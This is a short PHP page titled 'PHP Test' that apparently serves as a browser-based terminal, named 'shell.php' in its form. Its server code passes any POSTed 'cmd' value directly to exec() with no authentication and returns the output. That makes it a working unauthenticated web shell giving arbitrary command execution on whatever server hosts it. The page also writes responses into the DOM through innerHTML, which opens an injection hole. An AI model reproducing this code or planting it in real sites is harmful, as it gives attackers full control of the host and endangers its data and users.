<?php

    error_reporting(E_ALL);
    ini_set('display_errors', 1);

    if($_SERVER['REQUEST_METHOD'] == 'POST')
    {
            $lines = array();
            $output = exec($_POST['cmd'], $lines);
            //$lines = preg_split("/\r\n|\n|\r/", $output);

            header('Content-Type: application.json');
            echo json_encode(array("foo" => $lines));

            exit();
    }

?>

<html>
    <head>
        <title>PHP Test</title>

        <style>
            #terminal-out {
                background: #000000;
                width: 100%;
                overflow-y: auto;
                height: 50%;

            }

            #terminal-out > p {
                color: #6AFF00;
            }

        </style>

        <script>
        var update_terminal = function(text) {

            var new_paragraph = document.createElement("p");
            new_paragraph.innerHTML = text;

            document.getElementById("terminal-out").appendChild(new_paragraph);

            /*keep scroll to bottom of div
            var ouput_div = document.getElementById('terminal-out');
            output_div.scrollTop = ouput_div.scrollHeight;*/

            new_paragraph.scrollIntoView(false);
            return new_paragraph;
        };

        var send_command = function() {
            var cmd = document.getElementById("cmd").value;

            var req = new XMLHttpRequest();
            req.onreadystatechange = function() {
                if(req.readyState === 4) {
                    update_terminal(req.responseText);
                }
            };

            req.open("POST", document.URL, true);
            req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            req.send("cmd="+cmd);


        };


        </script>

    </head>

    <body>
        <code>
            <div id="terminal-out">
                <p>Test data foo foo adfaj atae adsf adsfat adkljasd cad asdlacdal</p>
                <p>Test data foo foo adfaj atae adsf adsfat adkljasd cad asdlacdal</p>
                <p>Test data foo foo adfaj atae adsf adsfat adkljasd cad asdlacdal</p>
                <p>Test data foo foo adfaj atae adsf adsfat adkljasd cad asdlacdal</p>
                <p>Test data foo foo adfaj atae adsf adsfat adkljasd cad asdlacdal</p>
                <p>Test data foo foo adfaj atae adsf adsfat adkljasd cad asdlacdal</p>
                <p>Test data foo foo adfaj atae adsf adsfat adkljasd cad asdlacdal</p>
                <p>Test data foo foo adfaj atae adsf adsfat adkljasd cad asdlacdal</p>
                <p>Test data foo foo adfaj atae adsf adsfat adkljasd cad asdlacdal</p>
            </div>
        </code>

        <form id="terminal" method="POST" action="shell.php">
            <input type="text" id="cmd">
            <input type="submit">
        </form>

        <input type="button" onclick="update_terminal('Foo Foo Foo Foo');">
    </body>
</html>